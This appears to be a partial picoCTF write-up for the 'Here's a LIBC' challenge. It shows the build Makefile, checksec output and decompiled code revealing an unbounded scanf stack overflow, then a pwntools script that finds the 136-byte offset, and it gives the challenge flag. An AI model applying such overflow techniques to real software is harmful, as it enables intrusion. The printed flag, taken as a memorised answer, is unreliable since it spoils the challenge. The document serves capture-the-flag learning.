# Here's a LIBC
## Description
I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 62289

> 90 points

## Hint
PWNTools has a lot of useful features for getting offsets.

``` makefile
all:
        gcc -Xlinker -rpath=./ -m64 -fno-stack-protector -no-pie -o vuln vuln.c

clean:
        rm vuln
```

```console
┌──(kali㉿kali)-[/tmp/herelibc]
└─$ checksec vuln 
[*] '/tmp/herelibc/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```

```c
void main(undefined4 param_1,undefined8 param_2)

{
  char cVar1;
  char acStack168 [24];
  undefined8 uStack144;
  undefined8 local_88;
  undefined4 local_7c;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined2 local_60;
  undefined local_5e;
  char *local_50;
  undefined8 local_48;
  ulong local_40;
  __gid_t local_34;
  ulong local_30;
  
  uStack144 = 0x40079c;
  local_88 = param_2;
  local_7c = param_1;
  setbuf(stdout,(char *)0x0);
  uStack144 = 0x4007a1;
  local_34 = getegid();
  uStack144 = 0x4007bb;
  setresgid(local_34,local_34,local_34);
  local_40 = 0x1b;
  local_78 = 0x20656d6f636c6557;
  local_70 = 0x636520796d206f74;
  local_68 = 0x6576726573206f68;
  local_60 = 0x2172;
  local_5e = 0;
  local_48 = 0x1a;
  local_50 = acStack168;
  for (local_30 = 0; local_30 < local_40; local_30 = local_30 + 1) {
    cVar1 = convert_case((int)*(char *)((long)&local_78 + local_30),local_30);
    local_50[local_30] = cVar1;
  }
  puts(local_50);
  do {
    do_stuff();
  } while( true );
}
```

```c
void do_stuff(void)

{
  char cVar1;
  undefined local_89;
  char local_88 [112];
  undefined8 local_18;
  ulong local_10;
  
  local_18 = 0;
  __isoc99_scanf("%[^\n]",local_88);
  __isoc99_scanf(&DAT_0040093a,&local_89);
  for (local_10 = 0; local_10 < 100; local_10 = local_10 + 1) {
    cVar1 = convert_case((int)local_88[local_10],local_10);
    local_88[local_10] = cVar1;
  }
  puts(local_88);
  return;
}
```
```note
picoCTF{1_<3_sm4sh_st4cking_  8652b55904cb7c}
```
find the offset base buffer overflow

```python
def find_the_offset (NUM_CYCLIC_BYTES = 256):
        payload = cyclic(NUM_CYCLIC_BYTES)
        # Run the process once so that it crashes.
        proc = process([exe.path])
        # Send the payload.
        proc.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!', payload)
        proc.wait()
        # Get the core dump.
        core = proc.corefile
        assert pack(core.fault_addr) in payload, "Faulting address not in the \
                                                cyclic pattern."
        # find offset
        offset = cyclic_find(pack(core.fault_addr), n=4)
        return offset # offset: 136
      
```

